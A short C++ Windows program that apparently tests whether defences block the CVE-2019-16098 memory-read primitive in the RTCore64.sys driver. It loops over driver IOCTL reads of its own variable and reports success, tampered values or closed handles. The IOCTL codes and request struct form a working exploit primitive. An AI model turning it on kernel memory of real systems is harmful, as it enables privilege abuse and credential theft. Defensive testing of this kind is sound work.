#include <windows.h>
#include <iostream>
#include <chrono>
#include <thread>

// CVE-2019-16098 IOCTLs for RTCore64.sys
#define RTCORE64_MSR_READ_CODE    0x80002030
#define RTCORE64_MEMORY_READ_CODE 0x80002048

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};

int main() {
    LPCWSTR deviceName = L"\\\\.\\RTCore64";
    
    // Value that will be read from memory
    DWORD secret = 0xDEADCCCC; 

    // 1. Initial Capture
    HANDLE hDevice = CreateFileW(deviceName, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cout << "[!] FAILED: Could not open handle. Run as Admin! Error: " << GetLastError() << std::endl;
        return -1;
    }

    std::cout << "[+] SUCCESS: Handle captured. Secret value is at: 0x" << std::hex << &secret << std::endl;
    std::cout << "[*] Monitoring and Reading. Do actions that might break this now.." << std::endl;
    std::cout << "--------------------------------------------------------" << std::endl;

    while (true) {
        RTCORE64_MEMORY_READ req = {0};
        req.Address = (DWORD64)&secret; // Reading "secret"
        req.ReadSize = sizeof(DWORD);

        DWORD bytesReturned;
        // IOCTL > driver
        BOOL success = DeviceIoControl(hDevice, RTCORE64_MEMORY_READ_CODE, 
                                     &req, sizeof(req), &req, sizeof(req), 
                                     &bytesReturned, NULL);

        if (success) {
            if (req.Value == secret) {
                std::cout << "[Active] READ SUCCESS: " << std::hex << req.Value << std::endl;
            } else {
                std::cout << "[Active] NEUTERED: Read succeeded but returned wrong value: " << std::hex << req.Value << std::endl;
            }
        } else {
            DWORD err = GetLastError();
            // Error 6 = Handle closed
            if (err == 6) {
                std::cout << "[!] FATAL: Handle was STRIPPED/CLOSED" << std::endl;
                break;
            } else {
                std::cout << "[!] IOCTL Failed. Error: " << err << std::endl;
            }
        }

        std::this_thread::sleep_for(std::chrono::seconds(5));
    }

    CloseHandle(hDevice);
    system("pause");
    return 0;
}
